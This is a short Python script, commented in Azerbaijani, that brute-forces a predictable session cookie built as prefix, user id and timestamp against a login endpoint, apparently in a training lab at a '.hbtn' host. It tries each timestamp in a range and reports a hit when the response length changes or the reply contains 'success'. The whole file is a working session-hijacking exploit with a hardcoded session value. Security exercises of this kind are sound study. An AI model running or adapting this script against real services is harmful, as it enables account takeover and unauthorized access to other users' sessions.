import requests
import json

# Yeni prefix və session_id (05 olan)
prefix = "9f6d36ef-a484-4108-800"
session_id = "2229805" # 04 və 06 arasındakı user
target_url = "http://web0x01.hbtn/api/a1/hijack_session/login"

# Verilən iki timestamp arasındakı aralıq
start_timestamp = 17687188002
end_timestamp = 17687188235

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Accept-Language": "en-US,en;q=0.9",
    "Content-Type": "application/json",
    "Connection": "keep-alive"
}

# Sənin cari session cookie-n (Browser-dən götürdüyün ən son session deyeri)
your_session = "LVvSgs2Lu0YhD79hCSJMBWMAt1yXz-llxBZwatwf_lY.bkyFUeRTgd1U45OLYnV1Rx7dFtI"

# Login data
login_data = json.dumps({"email": "test@test.com", "password": "test"})

# Baseline (Xətalı cookie ilə normal cavabın ölçüsünü yoxlamaq üçün)
baseline_cookies = {
    "hijack_session": f"{prefix}-0000000-00000000000",
    "session": your_session
}

try:
    baseline = requests.post(target_url, data=login_data, cookies=baseline_cookies, headers=headers, timeout=10)
    baseline_len = len(baseline.text)
    print(f"[*] Baseline response: {baseline.text[:100]}...")
    print(f"[*] Baseline length: {baseline_len}")
    print(f"[*] Araliq: {start_timestamp} - {end_timestamp}\n")

    for ts in range(start_timestamp, end_timestamp + 1):
        # Yeni format: prefix-session_id-timestamp
        cookie_value = f"{prefix}-{session_id}-{ts}"
        
        cookies = {
            "hijack_session": cookie_value,
            "session": your_session
        }
        
        r = requests.post(target_url, data=login_data, cookies=cookies, headers=headers, timeout=10)
        
        # Əgər cavab ölçüsü fərqlidirsə və ya içində "success" varsa, deməli tapıldı
        if len(r.text) != baseline_len or "success" in r.text.lower():
            print(f"\n[+] TAPILDI!")
            print(f"[+] Timestamp: {ts}")
            print(f"[+] Cookie: {cookie_value}")
            print(f"[+] Response: {r.text}")
            break
        
        print(f"[*] Yoxlanılır: {ts}", end='\r')
    else:
        print("\n[-] Təəssüf ki, bu aralıqda heç nə tapılmadı.")

except Exception as e:
    print(f"\n[!] Xəta baş verdi: {e}")